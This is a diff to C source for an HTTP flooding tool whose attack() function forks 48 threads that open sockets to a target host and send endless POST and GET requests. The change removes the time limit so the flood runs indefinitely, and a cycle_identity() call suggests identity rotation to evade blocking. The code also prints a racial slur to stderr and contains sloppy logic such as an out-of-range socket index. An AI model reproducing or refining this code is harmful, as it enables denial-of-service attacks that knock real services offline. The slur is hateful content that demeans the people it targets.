@@ -49,22 +49,22 @@ void broke(int s) {
 #define CONNECTIONS 8
 #define THREADS 48
 
-void attack(char *host, char *port, char *timeEnd, int id) {
+void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
 	int x, i, g=1, r;
 	for(x=0; x < CONNECTIONS; x++)
 		sockets[x]=0;
 	
-	while(--timeEnd) {
+	while(1) {
 		
 		for(i=0; i < PPS; i++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 			write(sockets[x], "POST / HTTP/1.1\r\n\r\n", 19);
-			if(i < PPS) {
+			
 				write(sockets[x], "GET / HTTP/1.1\r\n\r\n", 18);
 				
-			} else 
+			
 				fprintf(stderr, "Niggers\n");
 			fprintf(stderr, "[%i: Voly Sent]\n", id);
 		}
@@ -92,11 +92,11 @@ int main(int argc, char **argv) {
 	int x;
 	
 	
-	if(argc !=4)
+	if(argc !=3)
 		cycle_identity();
 	for(x=0; x != THREADS; x++) {
 		if(fork())
-			attack(argv[1], argv[2], argv[3], x);
+			attack(argv[1], argv[2], x);
 		
 	}
 	getc(stdin);
